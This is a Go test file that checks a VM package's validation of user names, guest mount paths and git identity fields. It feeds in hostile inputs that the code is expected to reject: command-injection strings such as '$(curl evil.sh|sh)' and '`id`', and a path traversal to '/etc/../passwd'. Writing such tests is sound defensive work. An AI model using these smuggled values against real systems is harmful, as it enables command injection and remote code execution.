package vm

import (
	"strings"
	"testing"
)

func TestValidateSpec(t *testing.T) {
	base := func() *Spec { return &Spec{Name: "dev1", User: "tester", GuestUID: 501} }

	ok := func(s *Spec, m []GuestMount) {
		t.Helper()
		if err := ValidateSpec(s, m); err != nil {
			t.Errorf("ValidateSpec(%+v, %+v) = %v, want nil", s, m, err)
		}
	}
	bad := func(s *Spec, m []GuestMount, want string) {
		t.Helper()
		err := ValidateSpec(s, m)
		if err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("ValidateSpec(%+v, %+v) = %v, want error containing %q", s, m, err, want)
		}
	}

	ok(base(), nil)
	ok(base(), []GuestMount{{Tag: "m0", Host: "/h", Guest: "/mnt/data-1.2_x"}})

	s := base()
	s.User = "root;id"
	bad(s, nil, "invalid user")
	s = base()
	s.User = "-evil"
	bad(s, nil, "invalid user")
	s = base()
	s.User = "1abc"
	bad(s, nil, "invalid user")

	bad(base(), []GuestMount{{Tag: "m0", Host: "/h", Guest: "relative"}}, "invalid guest mount path")
	bad(base(), []GuestMount{{Tag: "m0", Host: "/h", Guest: "/etc/../passwd"}}, "invalid guest mount path")
	bad(base(), []GuestMount{{Tag: "m0", Host: "/h", Guest: "/mnt/a b"}}, "invalid guest mount path")

	s = base()
	s.GitEmail = "$(curl evil.sh|sh)"
	bad(s, nil, "invalid git email")
	s = base()
	s.GitName = "`id`"
	bad(s, nil, "invalid git name")
	s = base()
	s.GitEmail = "a@b.com\nmalicious"
	bad(s, nil, "invalid git email")

	s = base()
	s.GitEmail = "dev@example.com"
	s.GitName = "Dev O'Neil"
	ok(s, nil)
}

func TestUserDataRejectsInjection(t *testing.T) {
	s := &Spec{Name: "dev1", User: "u", GuestUID: 501, GitEmail: "$(id)"}
	if _, err := userData(s, "ssh-ed25519 AAAA", nil); err == nil {
		t.Fatal("userData should reject git email injection")
	}
}
